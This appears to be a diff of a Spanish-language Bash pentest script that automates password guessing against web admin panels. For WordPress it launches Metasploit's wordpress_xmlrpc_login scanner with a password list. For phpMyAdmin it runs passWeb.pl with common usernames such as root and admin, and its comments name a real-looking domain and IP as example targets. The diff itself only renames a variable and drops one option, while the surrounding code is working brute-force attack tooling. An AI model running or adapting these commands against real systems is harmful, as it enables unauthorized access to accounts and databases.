@@ -214,11 +214,10 @@ then
 	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
 		
 	for line in $(cat servicios/admin-web.txt); do	
-		
-		echo -e "\n\t########### $line #######"				
-
+							
 		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo/wp-login.php https://www.sanmateo.com.bo:8443/wp-login.php		
 		fingerprint=`echo $line | cut -d ";" -f 2`
+		echo -e "\n\t########### $ip_port_path #######"	
 			
 		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
 		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
@@ -232,12 +231,10 @@ then
 			fi
 		fi
 		host=`echo $host_port | cut -d ":" -f 1`				
-		path_url=`echo $ip_port_path | cut -d "/" -f 4-5`	
-		path_url=`echo "/"$path_url`
+		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
+		path_web=`echo "/"$path_web`
 
 		
-		
-		echo "ip_port_path $ip_port_path "
 		if [[ $fingerprint = *"wordpress"* ]]; then
 			echo -e "$OKGREEN \t[+] Wordpress identificado en $host:$port $RESET"						
 			echo -e "\t[+] Probando contraseñas comunes ...."
@@ -248,11 +245,11 @@ then
 					#Dominio
 					if [[ "$host" == *"bo" || "$host" == *"com"  || "$host" == *"net" || "$host" == *"org" || "$host" == *"net" ]];then 
 						real_ip=`host $host | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_url ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_url ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_url ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_url ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi			
 				done
 			else
@@ -260,11 +257,11 @@ then
 				#$host = dominio
 					if [[ "$host" == *"bo" || "$host" == *"com"  || "$host" == *"net" || "$host" == *"org" || "$host" == *"net" ]];then 
 						real_ip=`host $host | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_url ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_url ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_url ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_url ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi										
 			fi						
 			grep --color=never -i 'SUCCESS' logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordAdivinadoServ.txt 									
@@ -272,30 +269,30 @@ then
 		
 		if [[ $fingerprint = *"phpmyadmin"* ]]; then
 			echo -e "\t[+] phpMyAdmin identificado"
-			echo "passWeb.pl -t $host -p $port -m phpmyadmin -d \"/$path_url\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f passwords.txt" > logs/cracking/"$host"_"$port"_passwordBD.txt 
-			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u root -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
-			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u admin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &			
-			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u phpmyadmin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
+			echo "passWeb.pl -t $host -p $port -m phpmyadmin -d \"/$path_web\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f passwords.txt" > logs/cracking/"$host"_"$port"_passwordBD.txt 
+			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u root -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
+			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u admin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &			
+			passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u phpmyadmin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
 
 			#######  wordpress ######
 			grep -qi wordpress .enumeracion2/"$host"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u wordpress -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
+				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u wordpress -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
 			fi
 
 			#######  joomla ######
 			grep -qi joomla .enumeracion2/"$host"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u joomla -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
+				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u joomla -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt &
 			fi
 
 			#######  drupal ######
 			grep -qi drupal .enumeracion2/"$host"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_url" -u drupal -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt&
+				passWeb.pl -t $host -p $port -m phpmyadmin -d "$path_web" -u drupal -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordBD.txt&
 			fi
 
 					
